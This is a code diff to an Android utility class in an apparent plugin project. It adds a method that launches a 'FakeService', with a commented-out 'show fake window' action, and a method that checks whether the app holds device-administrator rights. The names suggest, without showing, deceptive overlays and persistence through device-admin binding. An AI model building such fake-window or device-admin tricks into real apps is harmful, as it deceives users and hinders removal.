@@ -1,12 +1,18 @@
 package com.xstd.plugin.Utils;
 
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
 import android.content.Context;
+import android.content.Intent;
 import android.content.SharedPreferences;
 import android.provider.Settings;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import com.plugin.common.utils.UtilsRuntime;
+import com.xstd.plugin.binddevice.DeviceBindBRC;
 import com.xstd.plugin.config.AppRuntime;
+import com.xstd.plugin.config.Config;
+import com.xstd.plugin.service.FakeService;
 
 import java.io.UnsupportedEncodingException;
 import java.util.UUID;
@@ -20,6 +26,21 @@ import java.util.regex.Pattern;
  * To change this template use File | Settings | File Templates.
  */
 public class CommonUtil {
+
+    public static void startFakeService(Context context, String from) {
+        if (Config.DEBUG) {
+            Config.LOGD("[[CommonUtil::startFakeService]] from reason : " + from);
+        }
+        Intent is = new Intent();
+        is.setClass(context, FakeService.class);
+//        is.setAction(FakeService.ACTION_SHOW_FAKE_WINDOW);
+        context.startService(is);
+    }
+
+    public static boolean isBindingActive(Context context) {
+        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+        return dpm.isAdminActive(new ComponentName(context, DeviceBindBRC.class));
+    }
 
     private static final String PREFS_FILE = "device_id.xml";
     private static final String PREFS_DEVICE_ID = "device_id";
